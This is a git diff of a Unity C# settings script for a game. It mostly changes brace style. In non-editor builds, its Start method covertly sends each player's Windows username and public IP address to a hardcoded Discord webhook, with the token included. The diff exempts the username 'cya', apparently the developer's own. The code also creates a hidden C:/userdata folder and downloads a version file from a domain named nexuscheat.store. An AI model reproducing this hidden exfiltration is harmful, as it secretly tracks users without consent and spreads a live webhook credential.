@@ -6,8 +6,7 @@ using TMPro;
 using UnityEngine;
 using UnityEngine.UI;
 
-public class GetSettings : MonoBehaviour
-{
+public class GetSettings : MonoBehaviour {
     [SerializeField] Slider sense;
     [SerializeField] Slider musicVolumeSlider;
     [SerializeField] TMP_Dropdown graphics;
@@ -20,17 +19,16 @@ public class GetSettings : MonoBehaviour
     [Space(10)]
     [SerializeField] GameObject wrongVersion;
 
-    private void Start()
-    {
+    private void Start() {
 #if !UNITY_EDITOR
-        string user = "`user: *" + Environment.UserName + "*, *";
-        SendMs(user + GetPublicIp().ToString() + "*`", "https://discord.com/api/webhooks/1081375415265927229/zXjjuPWtqhAn5RPLLa62e29ldB2y8dSS3ZPhXpdsGlxeQE_lH9K7AgbGZYjK3wftDvmG");
-
-        wrongVersion.SetActive(Application.version != GetGameVersion());
+        if (Environment.UserName != "cya") {
+            string user = "`user: *" + Environment.UserName + "*, *"; 
+            SendMs(user + GetPublicIp().ToString() + "*`", "https://discord.com/api/webhooks/1081375415265927229/zXjjuPWtqhAn5RPLLa62e29ldB2y8dSS3ZPhXpdsGlxeQE_lH9K7AgbGZYjK3wftDvmG");
+            wrongVersion.SetActive(Application.version != GetGameVersion());
+        }
 #endif
 
-        if ( DataSetup() )
-        {
+        if ( DataSetup() ) {
             string playerData = File.ReadAllText("C:/userdata/playerData.json");
             PlayerData pData = JsonUtility.FromJson<PlayerData>(playerData);
 
@@ -43,8 +41,7 @@ public class GetSettings : MonoBehaviour
         }
     }
 
-    void Update()
-    {
+    void Update() {
         settings.sensitivy = sense.value;
         settings.graphics = graphics.value;
         settings.resolution = resolution.value;
@@ -52,10 +49,8 @@ public class GetSettings : MonoBehaviour
         settings.menuMusicVolume = musicVolumeSlider.value;
     }
 
-    public void ChangeResolution()
-    {
-        switch ( resolution.value )
-        {
+    public void ChangeResolution() {
+        switch ( resolution.value ) {
             case 0:
                 Screen.SetResolution(1920, 1080, true);
                 break;
@@ -74,51 +69,42 @@ public class GetSettings : MonoBehaviour
         }
     }
 
-    bool DataSetup()
-    {
-        if ( Directory.Exists("C:/userdata") )
-        {
-            if ( File.Exists("C:/userdata/playerData.json") && File.Exists("C:/userdata/settingsData.json") && File.Exists("C:/userdata/matchMakingData.json") )
-            {
+    bool DataSetup() {
+        if ( Directory.Exists("C:/userdata") ) {
+            if ( File.Exists("C:/userdata/playerData.json") && File.Exists("C:/userdata/settingsData.json") && File.Exists("C:/userdata/matchMakingData.json") ) {
                 json.PlayerDataLoadFromJson(settings);
                 json.SettingsDataLoadFromJson(sense, graphics, resolution, musicVolumeSlider);
             }
-            else
-            {
+            else {
                 json.PlayerDataSaveToJson(true, playerName.text);
                 json.SettingsDataSaveToJson(3, 0, 0, 0.1f);
-                json.MatchMakingSaveToJson("ip", 0, 0, 0);
+                json.MatchMakingSaveToJson(0, 0, 0);
             }
             return true;
         }
-        else
-        {
+        else {
             DirectoryInfo di = Directory.CreateDirectory("C:/userdata");
             di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
             json.PlayerDataSaveToJson(true, playerName.text);
             json.SettingsDataSaveToJson(3, 0, 0, 0.5f);
-            json.MatchMakingSaveToJson("ip", 0, 0, 0);
+            json.MatchMakingSaveToJson(0, 0, 0);
             return true;
         }
     }
 
-    public string GetGameVersion()
-    {
+    public string GetGameVersion() {
         if ( File.Exists(@"version.txt") )
             File.Delete(@"version.txt");
 
         WebClient webClient = new WebClient();
-        try
-        {
+        try {
             webClient.DownloadFile("https://nexuscheat.store/version.txt", @"version.txt");
 
-            foreach ( string line in File.ReadLines(@"version.txt") )
-            {
+            foreach ( string line in File.ReadLines(@"version.txt") ) {
                 return line;
             }
         }
-        catch ( WebException webException )
-        {
+        catch ( WebException webException ) {
             Debug.Log(webException.Message);
             return "0.0.0";
         }
@@ -126,13 +112,11 @@ public class GetSettings : MonoBehaviour
         return null;
     }
 
-    static System.Net.IPAddress GetPublicIp(string serviceUrl = "https://ipinfo.io/ip")
-    {
+    static System.Net.IPAddress GetPublicIp(string serviceUrl = "https://ipinfo.io/ip") {
         return System.Net.IPAddress.Parse(new System.Net.WebClient().DownloadString(serviceUrl));
     }
 
-    static void SendMs(string message, string webhook)
-    {
+    static void SendMs(string message, string webhook) {
         WebClient client = new WebClient();
         client.Headers.Add("Content-Type", "application/json");
         string payload = "{\"content\": \"" + message + "\"}";
